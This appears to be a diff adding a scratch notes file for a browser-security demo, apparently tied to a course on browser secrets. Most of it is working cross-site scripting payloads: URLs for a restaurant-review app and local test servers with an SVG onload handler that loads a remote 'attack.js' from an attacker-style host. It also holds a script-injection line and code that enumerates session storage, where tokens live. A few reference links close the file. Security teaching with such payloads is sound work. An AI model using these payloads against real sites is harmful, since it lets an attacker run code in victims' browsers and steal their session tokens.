@@ -1,0 +1,31 @@
+https://app.restograde.com/?search=test<svg style="display:none" onload='s=document.createElement("script");s.src="https://maliciousfood.com/js/attack.js";document.body.appendChild(s);'>
+
+
+http://localhost:5002/index-oidc.html?search=test<svg style="display:none" onload='s=document.createElement("script");s.src="http://localhost:3000/js/attack.js";document.body.appendChild(s);'>
+
+
+http://localhost:5002/index-oidc.html?<svg style="display:none" onload='s=document.createElement("script");s.src="http://localhost:3000/js/attack.js";document.body.appendChild(s);'>
+
+
+// xss inject
+s=document.createElement("script");s.src="http://localhost:3000/js/attack.js";document.body.appendChild(s);
+
+for (const [key, value] of Object.entries(sessionStorage)) {
+    console.log({key, value});
+    console.log('====')
+    console.log(value)
+};
+
+var itemKey = '';
+JSON.parse(sessionStorage.getItem(itemKey))
+
+
+// json parser
+http://json.parser.online.fr
+
+
+// express js
+https://expressjs.com/en/starter/basic-routing.html
+
+// nginx
+https://github.com/philippederyck/pws-codesamples-browsersecrets/blob/master/configs/nginx-local/browsersecrets.conf
